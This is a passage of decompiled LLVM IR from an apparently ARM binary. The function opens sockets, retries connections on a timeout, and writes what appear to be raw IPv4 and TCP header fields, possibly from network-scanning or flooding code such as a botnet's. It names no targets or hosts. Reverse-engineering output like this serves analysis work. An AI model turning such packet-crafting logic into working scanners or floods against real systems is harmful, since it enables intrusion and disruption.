  %tmp90 = sub nsw i32 0, %v1_b9f8
  %v4_ba00 = and i32 %tmp90, 4
  %v1_ba10 = urem i32 %v6_b584, 2
  %tmp91 = sub nsw i32 0, %v1_ba10
  %v3_ba18 = and i32 %tmp91, 2
  %v1_ba28 = urem i32 %v6_b5a4, 2
  br label %dec_label_pc_b650

dec_label_pc_b650:                                ; preds = %dec_label_pc_b7c4, %dec_label_pc_b64c
  %stack_var_-60.0 = phi i32 [ %tmp35, %dec_label_pc_b64c ], [ %stack_var_-60.5, %dec_label_pc_b7c4 ]
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_b65c = call i32 @function_14ba0(i32 2, i32 1, i32 0)
  store i32 %v3_b65c, i32* %r0.global-to-local, align 4
  %v7_b660 = icmp eq i32 %v3_b65c, -1
  store i1 %v7_b660, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_b65c, i32* @r5, align 4
  br i1 %v7_b660, label %dec_label_pc_b7c4, label %dec_label_pc_b66c

dec_label_pc_b66c:                                ; preds = %dec_label_pc_b650, %dec_label_pc_b7a0
  %v0_b674 = phi i32 [ %v3_b7b4, %dec_label_pc_b7a0 ], [ %v3_b65c, %dec_label_pc_b650 ]
  %stack_var_-60.1 = phi i32 [ %v0_b85c, %dec_label_pc_b7a0 ], [ %stack_var_-60.0, %dec_label_pc_b650 ]
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_b674 = call i32 @function_12fb4(i32 %v0_b674, i32 3, i32 0)
  store i32 4, i32* %r1.global-to-local, align 4
  %v1_b67c = or i32 %v3_b674, 2048
  store i32 %v1_b67c, i32* %r2.global-to-local, align 4
  %v0_b680 = load i32, i32* @r5, align 4
  store i32 %v0_b680, i32* %r0.global-to-local, align 4
  %v3_b684 = call i32 @function_12fb4(i32 %v0_b680, i32 4, i32 %v1_b67c)
  store i32 %v3_b684, i32* %r0.global-to-local, align 4
  %v3_b688 = load i32, i32* %stack_var_-44, align 4
  %v5_b690 = mul i32 %v3_b688, 24
  store i32 %v2_b694, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 2, i32* %stack_var_-64, align 4
  %v2_b6a4 = add i32 %v5_b690, %arg2
  store i32 %v2_b6a4, i32* %r3.global-to-local, align 4
  %v1_b6a8 = add i32 %v2_b6a4, 20
  %v2_b6a8 = inttoptr i32 %v1_b6a8 to i8*
  %v3_b6a8 = load i8, i8* %v2_b6a8, align 1
  %v4_b6a8 = zext i8 %v3_b6a8 to i32
  store i32 %v4_b6a8, i32* %r2.global-to-local, align 4
  %v2_b6ac = icmp ugt i8 %v3_b6a8, 30
  %v7_b6ac = icmp eq i8 %v3_b6a8, 31
  store i1 %v7_b6ac, i1* %cpsr_z.global-to-local, align 1
  %v2_b6b0 = xor i1 %v7_b6ac, true
  %v3_b6b0 = and i1 %v2_b6ac, %v2_b6b0
  br i1 %v3_b6b0, label %bb, label %bb70

bb:                                               ; preds = %dec_label_pc_b66c
  %v5_b6b0 = add i32 %v2_b6a4, 16
  %v6_b6b0 = inttoptr i32 %v5_b6b0 to i32*
  %v7_b6b0 = load i32, i32* %v6_b6b0, align 4
  store i32 %v7_b6b0, i32* %r3.global-to-local, align 4
  br label %bb70

bb70:                                             ; preds = %dec_label_pc_b66c, %bb
  %v4_b6b4 = phi i32 [ %v2_b6a4, %dec_label_pc_b66c ], [ %v7_b6b0, %bb ]
  %v4_b6b4.stack_var_-60.1 = select i1 %v3_b6b0, i32 %v4_b6b4, i32 %stack_var_-60.1
  %v2_b6b8 = xor i1 %v2_b6ac, true
  %v3_b6b8 = or i1 %v7_b6ac, %v2_b6b8
  br i1 %v3_b6b8, label %dec_label_pc_b800, label %dec_label_pc_b6bc

dec_label_pc_b6bc:                                ; preds = %bb70
  store i32 %v3_b4ec, i32* %r2.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i1 %v3_b83c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_b83c, label %dec_label_pc_b848, label %dec_label_pc_b6d0

dec_label_pc_b6d0:                                ; preds = %dec_label_pc_b800, %dec_label_pc_b6bc
  %stack_var_-60.3 = phi i32 [ %v1_b82c, %dec_label_pc_b800 ], [ %v4_b6b4.stack_var_-60.1, %dec_label_pc_b6bc ]
  store i32 %v3_b4ec, i32* %r0.global-to-local, align 4
  %v1_b6d4 = call i32 @function_14898(i32 %v3_b4ec)
  %v2_b6d4 = trunc i32 %v1_b6d4 to i16
  store i32 %v1_b6d4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b6e0

dec_label_pc_b6e0:                                ; preds = %dec_label_pc_b848, %dec_label_pc_b6d0
  %v0_b85c = phi i32 [ %stack_var_-60.6, %dec_label_pc_b848 ], [ %stack_var_-60.3, %dec_label_pc_b6d0 ]
  %storemerge4 = phi i16 [ %v1_b848, %dec_label_pc_b848 ], [ %v2_b6d4, %dec_label_pc_b6d0 ]
  store i32 %v2_b6e0, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v0_b6e8 = load i32, i32* @r5, align 4
  store i32 %v0_b6e8, i32* %r0.global-to-local, align 4
  %v3_b6ec = call i32 @function_147e4(i32 %v0_b6e8, i32 %v2_b6e0, i32 16)
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_b6f4 = call i32 @function_15b1c(i32* null)
  store i32 %v2_b6f4, i32* %r0.global-to-local, align 4
  store i32 %v2_b6f4, i32* @r4, align 4
  %v9_b754 = icmp eq i32 %tmp32, %v0_b85c
  %v4_b77c = zext i16 %storemerge4 to i32
  %. = zext i1 %v9_b754 to i32
  %v9_b768 = icmp eq i1 %v9_b754, false
  %v9_b780 = icmp eq i32 %v3_b774, %v4_b77c
  br label %dec_label_pc_b710

dec_label_pc_b700:                                ; preds = %.thread29, %dec_label_pc_b770, %dec_label_pc_b798, %bb73
  %v2_b700 = call i32 @function_15b1c(i32* null)
  %v0_b704 = load i32, i32* @r4, align 4
  %v2_b704 = sub i32 %v2_b700, %v0_b704
  store i32 %v2_b704, i32* %r0.global-to-local, align 4
  %v7_b708 = icmp eq i32 %v2_b704, 10
  store i1 %v7_b708, i1* %cpsr_z.global-to-local, align 1
  %v8_b70c = icmp sgt i32 %v2_b704, 10
  br i1 %v8_b70c, label %dec_label_pc_b7a0, label %dec_label_pc_b710

dec_label_pc_b710:                                ; preds = %dec_label_pc_b700, %dec_label_pc_b6e0
  store i32 256, i32* @r2, align 4
  store i32 %v2_b64c, i32* @r1, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_b730 = load i32, i32* @fp, align 4
  store i32 %v0_b730, i32* @r0, align 4
  %v0_b738 = call i32 @function_14a78()
  store i32 %v0_b738, i32* %r2.global-to-local, align 4
  %v7_b740 = icmp eq i32 %v0_b738, -1
  store i1 %v7_b740, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r0.global-to-local, align 4
  br i1 %v7_b740, label %dec_label_pc_b7f4, label %dec_label_pc_b74c

dec_label_pc_b74c:                                ; preds = %dec_label_pc_b710
  store i32 %tmp32, i32* %r3.global-to-local, align 4
  store i32 %., i32* %r1.global-to-local, align 4
  %v7_b760 = icmp eq i32 %v0_b738, 40
  store i1 %v7_b760, i1* %cpsr_z.global-to-local, align 1
  %tmp92 = icmp ult i32 %v0_b738, 41
  br i1 %tmp92, label %.thread29, label %bb73

.thread29:                                        ; preds = %dec_label_pc_b74c
  store i32 0, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_b700

bb73:                                             ; preds = %dec_label_pc_b74c
  store i1 %v9_b768, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_b768, label %dec_label_pc_b700, label %dec_label_pc_b770

dec_label_pc_b770:                                ; preds = %bb73
  store i32 %v3_b774, i32* %r1.global-to-local, align 4
  store i32 %v2_b694, i32* %r3.global-to-local, align 4
  store i32 %v4_b77c, i32* %r2.global-to-local, align 4
  store i1 %v9_b780, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_b780, label %dec_label_pc_b788, label %dec_label_pc_b700

dec_label_pc_b788:                                ; preds = %dec_label_pc_b770
  store i32 %v4_b788, i32* %r2.global-to-local, align 4
  store i32 %v1_b78c, i32* %r3.global-to-local, align 4
  store i1 %v2_b790, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_b790, label %dec_label_pc_b858, label %dec_label_pc_b798

dec_label_pc_b798:                                ; preds = %dec_label_pc_b788
  store i1 %v2_b798, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_b798, label %dec_label_pc_b700, label %dec_label_pc_b7a0

dec_label_pc_b7a0:                                ; preds = %dec_label_pc_b798, %dec_label_pc_b700
  %v0_b7a0 = load i32, i32* @r5, align 4
  store i32 %v0_b7a0, i32* @r0, align 4
  %v1_b7a4 = call i32 @function_15b6c(i32 %v0_b7a0)
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_b7b4 = call i32 @function_14ba0(i32 2, i32 1, i32 0)
  store i32 %v3_b7b4, i32* %r0.global-to-local, align 4
  %v3_b7b8 = icmp eq i32 %v3_b7b4, -1
  %v8_b7b8 = icmp eq i32 %v3_b7b4, -1
  store i1 %v8_b7b8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_b7b4, i32* @r5, align 4
  br i1 %v3_b7b8, label %dec_label_pc_b7c4, label %dec_label_pc_b66c

dec_label_pc_b7c4:                                ; preds = %dec_label_pc_b7a0, %dec_label_pc_b650, %dec_label_pc_b934
  %stack_var_-60.5 = phi i32 [ %stack_var_-60.0, %dec_label_pc_b650 ], [ %v0_b85c, %dec_label_pc_b934 ], [ %v0_b85c, %dec_label_pc_b7a0 ]
  %v3_b7c4 = load i32, i32* %stack_var_-44, align 4
  %v1_b7c8 = add i32 %v3_b7c4, 1
  store i32 %v1_b7c8, i32* %r3.global-to-local, align 4
  %v0_b7cc = load i32, i32* @r6, align 4
  %v9_b7cc = icmp eq i32 %v0_b7cc, %v1_b7c8
  store i1 %v9_b7cc, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_b7c8, i32* %stack_var_-44, align 4
  %v8_b7d4 = icmp sgt i32 %v0_b7cc, %v1_b7c8
  br i1 %v8_b7d4, label %dec_label_pc_b650, label %dec_label_pc_b7d8

dec_label_pc_b7d8:                                ; preds = %dec_label_pc_b7c4
  store i32 %v6_b5c4, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_ba5c

dec_label_pc_b7ec:                                ; preds = %dec_label_pc_b608
  %v0_b7ec = load i32, i32* @fp, align 4
  store i32 %v0_b7ec, i32* @r0, align 4
  %v1_b7f0 = call i32 @function_15b6c(i32 %v0_b7ec)
  store i32 %v1_b7f0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b7f4

dec_label_pc_b7f4:                                ; preds = %dec_label_pc_b710, %dec_label_pc_b420, %dec_label_pc_b7ec
  %v1_b7fc = phi i32 [ %v3_b5f8, %dec_label_pc_b420 ], [ %v1_b7f0, %dec_label_pc_b7ec ], [ 0, %dec_label_pc_b710 ]
  store i32 %v3_b420, i32* %r4.global-to-local, align 4
  store i32 %v6_b420, i32* %r5.global-to-local, align 4
  store i32 %v18_b420, i32* %sb.global-to-local, align 4
  store i32 %v27_b420, i32* %lr.global-to-local, align 4
  ret i32 %v1_b7fc

dec_label_pc_b800:                                ; preds = %bb70
  %v1_b800 = add i32 %v4_b6b4, 16
  %v2_b800 = inttoptr i32 %v1_b800 to i32*
  %v3_b800 = load i32, i32* %v2_b800, align 4
  store i32 %v3_b800, i32* %r0.global-to-local, align 4
  %v1_b804 = call i32 @function_14a1c(i32 %v3_b800)
  store i32 %v1_b804, i32* %r0.global-to-local, align 4
  store i32 %v1_b804, i32* @r4, align 4
  %v0_b80c = call i32 @function_f570()
  store i32 %v0_b80c, i32* %r0.global-to-local, align 4
  %v3_b810 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b810, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %v5_b81c = mul i32 %v3_b810, 24
  %v2_b820 = add i32 %v5_b81c, %arg2
  store i32 %v2_b820, i32* %r3.global-to-local, align 4
  %v1_b824 = add i32 %v2_b820, 20
  %v2_b824 = inttoptr i32 %v1_b824 to i8*
  %v3_b824 = load i8, i8* %v2_b824, align 1
  %v4_b824 = zext i8 %v3_b824 to i32
  store i32 %v4_b824, i32* %r2.global-to-local, align 4
  %v0_b828 = load i32, i32* @r4, align 4
  %v7_b828 = lshr i32 %v0_b80c, %v4_b824
  %v8_b828 = add i32 %v7_b828, %v0_b828
  store i32 %v8_b828, i32* %r0.global-to-local, align 4
  %v1_b82c = call i32 @function_14874(i32 %v8_b828)
  store i32 %v1_b82c, i32* %r0.global-to-local, align 4
  store i32 %v3_b4ec, i32* %r2.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i1 %v3_b83c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_b83c, label %dec_label_pc_b848, label %dec_label_pc_b6d0

dec_label_pc_b848:                                ; preds = %dec_label_pc_b800, %dec_label_pc_b6bc
  %stack_var_-60.6 = phi i32 [ %v1_b82c, %dec_label_pc_b800 ], [ %v4_b6b4.stack_var_-60.1, %dec_label_pc_b6bc ]
  %v0_b848 = call i32 @function_f570()
  %v1_b848 = trunc i32 %v0_b848 to i16
  store i32 %v0_b848, i32* %r0.global-to-local, align 4
  store i32 %v2_b694, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_b6e0

dec_label_pc_b858:                                ; preds = %dec_label_pc_b788
  %v3_b858 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b858, i32* %r4.global-to-local, align 4
  %v1_b85c = load i32, i32* @r8, align 4
  %v5_b85c = mul i32 %v3_b858, 16
  %v6_b85c = add i32 %v1_b85c, %v5_b85c
  %v7_b85c = inttoptr i32 %v6_b85c to i32*
  store i32 %v0_b85c, i32* %v7_b85c, align 4
  %v0_b860 = load i32, i32* @sl, align 4
  %v1_b860 = add i32 %v0_b860, 4
  %v2_b860 = inttoptr i32 %v1_b860 to i32*
  %v3_b860 = load i32, i32* %v2_b860, align 4
  store i32 %v3_b860, i32* %r0.global-to-local, align 4
  %v1_b864 = call i32 @function_14a1c(i32 %v3_b860)
  store i32 %v1_b864, i32* %r0.global-to-local, align 4
  %v0_b868 = load i32, i32* %r4.global-to-local, align 4
  %v3_b868 = mul i32 %v0_b868, 16
  %v1_b86c = load i32, i32* @r8, align 4
  %v2_b86c = add i32 %v1_b86c, %v3_b868
  store i32 %v2_b86c, i32* %r4.global-to-local, align 4
  %v2_b870 = add i32 %v2_b86c, 4
  %v3_b870 = inttoptr i32 %v2_b870 to i32*
  store i32 %v1_b864, i32* %v3_b870, align 4
  %v0_b874 = load i32, i32* @sl, align 4
  %v1_b874 = add i32 %v0_b874, 8
  %v2_b874 = inttoptr i32 %v1_b874 to i32*
  %v3_b874 = load i32, i32* %v2_b874, align 4
  store i32 %v3_b874, i32* %r0.global-to-local, align 4
  %v3_b878 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b878, i32* %r5.global-to-local, align 4
  %v1_b87c = call i32 @function_14a1c(i32 %v3_b874)
  store i32 %v1_b87c, i32* %r0.global-to-local, align 4
  %v3_b880 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b880, i32* @r4, align 4
  %v0_b884 = load i32, i32* @sl, align 4
  %v1_b884 = add i32 %v0_b884, 2
  %v2_b884 = inttoptr i32 %v1_b884 to i16*
  %v3_b884 = load i16, i16* %v2_b884, align 2
  %v4_b884 = zext i16 %v3_b884 to i32
  store i32 %v4_b884, i32* %r1.global-to-local, align 4
  %v3_b888 = mul i32 %v3_b880, 16
  %v1_b88c = load i32, i32* @r8, align 4
  %v2_b88c = add i32 %v1_b88c, %v3_b888
  store i32 %v2_b88c, i32* %r3.global-to-local, align 4
  %v3_b890 = add i32 %v2_b88c, 12
  %v4_b890 = inttoptr i32 %v3_b890 to i16*
  store i16 %v3_b884, i16* %v4_b890, align 2
  store i32 %v3_b774, i32* %r2.global-to-local, align 4
  %v0_b8a0 = load i32, i32* %r5.global-to-local, align 4
  %v3_b8a0 = mul i32 %v0_b8a0, 16
  store i32 %v1_b8a4, i32* @r7, align 4
  %v1_b8a8 = load i32, i32* @r8, align 4
  %v2_b8a8 = add i32 %v1_b8a8, %v3_b8a0
  store i32 %v2_b8a8, i32* @r5, align 4
  %v2_b8ac = load i32, i32* %r3.global-to-local, align 4
  %v3_b8ac = add i32 %v2_b8ac, 14
  %v4_b8ac = inttoptr i32 %v3_b8ac to i16*
  store i16 %storemerge4, i16* %v4_b8ac, align 2
  %v1_b8b0 = load i32, i32* @r5, align 4
  %v2_b8b0 = add i32 %v1_b8b0, 8
  %v3_b8b0 = inttoptr i32 %v2_b8b0 to i32*
  store i32 %v1_b87c, i32* %v3_b8b0, align 4
  %v0_b8b4 = load i32, i32* @r7, align 4
  store i32 %v0_b8b4, i32* @r0, align 4
  %v0_b8b8 = call i32 @function_13cc8()
  store i32 %v0_b8b8, i32* %r0.global-to-local, align 4
  store i32 %v2_b44c, i32* %r3.global-to-local, align 4
  %v3_b8c0 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b8c0, i32* %r2.global-to-local, align 4
  %v2_b8c4 = load i32, i32* @r4, align 4
  %v5_b8c4 = mul i32 %v2_b8c4, 4
  %v6_b8c4 = add i32 %v5_b8c4, %v2_b44c
  %v7_b8c4 = inttoptr i32 %v6_b8c4 to i32*
  store i32 %v0_b8b8, i32* %v7_b8c4, align 4
  %v0_b8c8 = load i32, i32* %r3.global-to-local, align 4
  %v1_b8c8 = load i32, i32* %r2.global-to-local, align 4
  %v4_b8c8 = mul i32 %v1_b8c8, 4
  %v5_b8c8 = add i32 %v4_b8c8, %v0_b8c8
  %v6_b8c8 = inttoptr i32 %v5_b8c8 to i32*
  %v7_b8c8 = load i32, i32* %v6_b8c8, align 4
  store i32 %v7_b8c8, i32* @r4, align 4
  %v1_b8cc = inttoptr i32 %v7_b8c8 to i8*
  %v2_b8cc = load i8, i8* %v1_b8cc, align 1
  %tmp93 = urem i8 %v2_b8cc, 16
  %v1_b8d0 = zext i8 %tmp93 to i32
  %v1_b8d4 = or i32 %v1_b8d0, 64
  store i32 %v1_b8d4, i32* %r3.global-to-local, align 4
  %v1_b8d8 = trunc i32 %v1_b8d4 to i8
  store i8 %v1_b8d8, i8* %v1_b8cc, align 1
  %v0_b8dc = load i32, i32* @r4, align 4
  %v1_b8dc = inttoptr i32 %v0_b8dc to i8*
  %v2_b8dc = load i8, i8* %v1_b8dc, align 1
  %v3_b8dc = zext i8 %v2_b8dc to i32
  %v1_b8e0 = and i32 %v3_b8dc, 240
  %v1_b8e4 = or i32 %v1_b8e0, 5
  store i32 %v1_b8e4, i32* %r2.global-to-local, align 4
  %v1_b8e8 = trunc i32 %v1_b8e4 to i8
  store i8 %v1_b8e8, i8* %v1_b8dc, align 1
  %v0_b8f0 = load i32, i32* @r7, align 4
  %v3_b8f0 = mul i32 %v0_b8f0, 65536
  store i32 %v3_b8f0, i32* %r0.global-to-local, align 4
  %v2_b8f4 = load i32, i32* @r4, align 4
  %v3_b8f4 = add i32 %v2_b8f4, 1
  %v4_b8f4 = inttoptr i32 %v3_b8f4 to i8*
  store i8 %v1_b8f4, i8* %v4_b8f4, align 1
  %v0_b8f8 = load i32, i32* %r0.global-to-local, align 4
  %v3_b8f8 = udiv i32 %v0_b8f8, 65536
  store i32 %v3_b8f8, i32* %r0.global-to-local, align 4
  %v1_b8fc = call i32 @function_14898(i32 %v3_b8f8)
  %v2_b8fc = trunc i32 %v1_b8fc to i16
  %v3_b900 = load i32, i32* @r4, align 4
  %v4_b900 = add i32 %v3_b900, 2
  %v5_b900 = inttoptr i32 %v4_b900 to i16*
  store i16 %v2_b8fc, i16* %v5_b900, align 2
  store i32 %v3_b638, i32* %r0.global-to-local, align 4
  %v1_b908 = call i32 @function_14898(i32 %v3_b638)
  %v2_b908 = trunc i32 %v1_b908 to i16
  store i32 %v1_b908, i32* %r0.global-to-local, align 4
  store i32 %v1_b4cc, i32* %r1.global-to-local, align 4
  store i32 %v4_b910, i32* %r2.global-to-local, align 4
  store i1 %v2_b914, i1* %cpsr_z.global-to-local, align 1
  %v3_b918 = load i32, i32* @r4, align 4
  %v4_b918 = add i32 %v3_b918, 4
  %v5_b918 = inttoptr i32 %v4_b918 to i16*
  store i16 %v2_b908, i16* %v5_b918, align 2
  %v0_b91c = load i32, i32* %r2.global-to-local, align 4
  %v1_b91c = trunc i32 %v0_b91c to i8
  %v2_b91c = load i32, i32* @r4, align 4
  %v3_b91c = add i32 %v2_b91c, 8
  %v4_b91c = inttoptr i32 %v3_b91c to i8*
  store i8 %v1_b91c, i8* %v4_b91c, align 1
  %v0_b920 = load i32, i32* @r4, align 4
  %v1_b920 = add i32 %v0_b920, 20
  store i32 %v1_b920, i32* @sl, align 4
  %v0_b924 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_b924, label %dec_label_pc_b934, label %dec_label_pc_b928

dec_label_pc_b928:                                ; preds = %dec_label_pc_b858
  store i32 16384, i32* %r0.global-to-local, align 4
  %v1_b92c = call i32 @function_14898(i32 16384)
  %v2_b92c = trunc i32 %v1_b92c to i16
  store i32 %v1_b92c, i32* %r0.global-to-local, align 4
  %v3_b930 = load i32, i32* @r4, align 4
  %v4_b930 = add i32 %v3_b930, 6
  %v5_b930 = inttoptr i32 %v4_b930 to i16*
  store i16 %v2_b92c, i16* %v5_b930, align 2
  %v2_b938.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_b934

dec_label_pc_b934:                                ; preds = %dec_label_pc_b858, %dec_label_pc_b928
  %v2_b938 = phi i32 [ %v0_b920, %dec_label_pc_b858 ], [ %v2_b938.pre, %dec_label_pc_b928 ]
  %v3_b938 = add i32 %v2_b938, 9
  %v4_b938 = inttoptr i32 %v3_b938 to i8*
  store i8 6, i8* %v4_b938, align 1
  store i32 ptrtoint (i32* @global_var_2295c.90 to i32), i32* %r2.global-to-local, align 4
  %v2_b940 = load i32, i32* @global_var_2295c.90, align 4
  store i32 %v2_b940, i32* %r1.global-to-local, align 4
  %v1_b944 = load i32, i32* @r4, align 4
  %v2_b944 = add i32 %v1_b944, 12
  %v3_b944 = inttoptr i32 %v2_b944 to i32*
  store i32 %v2_b940, i32* %v3_b944, align 4
  %v3_b948 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b948, i32* %r3.global-to-local, align 4
  %v0_b94c = load i32, i32* @r8, align 4
  %v4_b94c = mul i32 %v3_b948, 16
  %v5_b94c = add i32 %v0_b94c, %v4_b94c
  %v6_b94c = inttoptr i32 %v5_b94c to i32*
  %v7_b94c = load i32, i32* %v6_b94c, align 4
  store i32 %v7_b94c, i32* %r2.global-to-local, align 4
  store i32 %v5_b94c, i32* %r3.global-to-local, align 4
  %v1_b958 = load i32, i32* @r4, align 4
  %v2_b958 = add i32 %v1_b958, 16
  %v3_b958 = inttoptr i32 %v2_b958 to i32*
  store i32 %v7_b94c, i32* %v3_b958, align 4
  %v0_b95c = load i32, i32* %r3.global-to-local, align 4
  %v1_b95c = add i32 %v0_b95c, 12
  %v2_b95c = inttoptr i32 %v1_b95c to i16*
  %v3_b95c = load i16, i16* %v2_b95c, align 2
  %v1_b960 = add i32 %v0_b95c, 8
  %v2_b960 = inttoptr i32 %v1_b960 to i32*
  %v3_b960 = load i32, i32* %v2_b960, align 4
  store i32 %v3_b960, i32* %r1.global-to-local, align 4
  %v2_b964 = load i32, i32* @r4, align 4
  %v3_b964 = add i32 %v2_b964, 20
  %v4_b964 = inttoptr i32 %v3_b964 to i16*
  store i16 %v3_b95c, i16* %v4_b964, align 2
  %v0_b968 = load i32, i32* %r1.global-to-local, align 4
  %v1_b968 = load i32, i32* @sl, align 4
  %v2_b968 = add i32 %v1_b968, 4
  %v3_b968 = inttoptr i32 %v2_b968 to i32*
  store i32 %v0_b968, i32* %v3_b968, align 4
  %v0_b96c = load i32, i32* @sl, align 4
  %v1_b96c = add i32 %v0_b96c, 13
  %v2_b96c = inttoptr i32 %v1_b96c to i8*
  %v3_b96c = load i8, i8* %v2_b96c, align 1
  %v4_b96c = zext i8 %v3_b96c to i32
  store i32 %v4_b96c, i32* %r2.global-to-local, align 4
  %v0_b970 = load i32, i32* %r3.global-to-local, align 4
  %v1_b970 = add i32 %v0_b970, 4
  %v2_b970 = inttoptr i32 %v1_b970 to i32*
  %v3_b970 = load i32, i32* %v2_b970, align 4
  store i32 %v3_b970, i32* %r1.global-to-local, align 4
  %v1_b974 = or i32 %v4_b96c, 1
  store i32 %v1_b974, i32* %r2.global-to-local, align 4
  %v1_b978 = add i32 %v0_b970, 14
  %v2_b978 = inttoptr i32 %v1_b978 to i16*
  %v3_b978 = load i16, i16* %v2_b978, align 2
  %v4_b978 = zext i16 %v3_b978 to i32
  store i32 %v4_b978, i32* %r3.global-to-local, align 4
  %v1_b97c = trunc i32 %v1_b974 to i8
  store i8 %v1_b97c, i8* %v2_b96c, align 1
  %v0_b980 = load i32, i32* %r3.global-to-local, align 4
  %v1_b980 = trunc i32 %v0_b980 to i16
  %v2_b980 = load i32, i32* @sl, align 4
  %v3_b980 = add i32 %v2_b980, 2
  %v4_b980 = inttoptr i32 %v3_b980 to i16*
  store i16 %v1_b980, i16* %v4_b980, align 2
  %v0_b984 = load i32, i32* @sl, align 4
  %v1_b984 = add i32 %v0_b984, 12
  %v2_b984 = inttoptr i32 %v1_b984 to i8*
  %v3_b984 = load i8, i8* %v2_b984, align 1
  %v4_b984 = zext i8 %v3_b984 to i32
  store i32 %v4_b984, i32* %r3.global-to-local, align 4
  %v1_b988 = add i32 %v0_b984, 13
  %v2_b988 = inttoptr i32 %v1_b988 to i8*
  %v3_b988 = load i8, i8* %v2_b988, align 1
  %v4_b988 = zext i8 %v3_b988 to i32
  %tmp94 = urem i8 %v3_b984, 16
  %v1_b98c = zext i8 %tmp94 to i32
  %v1_b990 = or i32 %v1_b98c, 128
  store i32 %v1_b990, i32* %r3.global-to-local, align 4
  %v1_b994 = or i32 %v4_b988, 16
  store i32 %v1_b994, i32* %r2.global-to-local, align 4
  %v0_b998 = load i32, i32* %r1.global-to-local, align 4
  %v2_b998 = add i32 %v0_b984, 8
  %v3_b998 = inttoptr i32 %v2_b998 to i32*
  store i32 %v0_b998, i32* %v3_b998, align 4
  %v0_b99c = load i32, i32* %r3.global-to-local, align 4
  %v1_b99c = trunc i32 %v0_b99c to i8
  %v2_b99c = load i32, i32* @sl, align 4
  %v3_b99c = add i32 %v2_b99c, 12
  %v4_b99c = inttoptr i32 %v3_b99c to i8*
  store i8 %v1_b99c, i8* %v4_b99c, align 1
  %v0_b9a0 = load i32, i32* %r2.global-to-local, align 4
  %v1_b9a0 = trunc i32 %v0_b9a0 to i8
  %v2_b9a0 = load i32, i32* @sl, align 4
  %v3_b9a0 = add i32 %v2_b9a0, 13
  %v4_b9a0 = inttoptr i32 %v3_b9a0 to i8*
  store i8 %v1_b9a0, i8* %v4_b9a0, align 1
  %v0_b9a4 = call i32 @function_f570()
  %v1_b9a4 = trunc i32 %v0_b9a4 to i16
  store i32 %v0_b9a4, i32* %r0.global-to-local, align 4
  store i32 %v1_b50c, i32* %r1.global-to-local, align 4
  %v0_b9ac = load i32, i32* @sl, align 4
  %v1_b9ac = add i32 %v0_b9ac, 13
  %v2_b9ac = inttoptr i32 %v1_b9ac to i8*
  %v3_b9ac = load i8, i8* %v2_b9ac, align 1
  %v4_b9ac = zext i8 %v3_b9ac to i32
  store i32 %v1_b9b0, i32* %r2.global-to-local, align 4
  %v1_b9b4 = and i32 %v4_b9ac, 223
  %v5_b9b8 = or i32 %v1_b9b4, %v4_b9b8
  store i32 %v5_b9b8, i32* %r3.global-to-local, align 4
  %v1_b9bc = trunc i32 %v5_b9b8 to i8
  store i8 %v1_b9bc, i8* %v2_b9ac, align 1
  %v0_b9c4 = load i32, i32* @sl, align 4
  %v1_b9c4 = add i32 %v0_b9c4, 13
  %v2_b9c4 = inttoptr i32 %v1_b9c4 to i8*
  %v3_b9c4 = load i8, i8* %v2_b9c4, align 1
  %v4_b9c4 = zext i8 %v3_b9c4 to i32
  store i32 %v1_b9c8, i32* %r3.global-to-local, align 4
  %v1_b9cc = and i32 %v4_b9c4, 239
  %v5_b9d0 = or i32 %v1_b9cc, %v4_b9d0
  store i32 %v5_b9d0, i32* %r2.global-to-local, align 4
  %v1_b9d4 = trunc i32 %v5_b9d0 to i8
  store i8 %v1_b9d4, i8* %v2_b9c4, align 1
  store i32 %v1_b54c, i32* %r1.global-to-local, align 4
  %v0_b9dc = load i32, i32* @sl, align 4
  %v1_b9dc = add i32 %v0_b9dc, 13
  %v2_b9dc = inttoptr i32 %v1_b9dc to i8*
  %v3_b9dc = load i8, i8* %v2_b9dc, align 1
  %v4_b9dc = zext i8 %v3_b9dc to i32
  store i32 %v1_b9e0, i32* %r2.global-to-local, align 4
  %v1_b9e4 = and i32 %v4_b9dc, 247
  %v5_b9e8 = or i32 %v1_b9e4, %v4_b9e8
  store i32 %v5_b9e8, i32* %r3.global-to-local, align 4
  %v1_b9ec = trunc i32 %v5_b9e8 to i8
  store i8 %v1_b9ec, i8* %v2_b9dc, align 1
  %v0_b9f4 = load i32, i32* @sl, align 4
  %v1_b9f4 = add i32 %v0_b9f4, 13
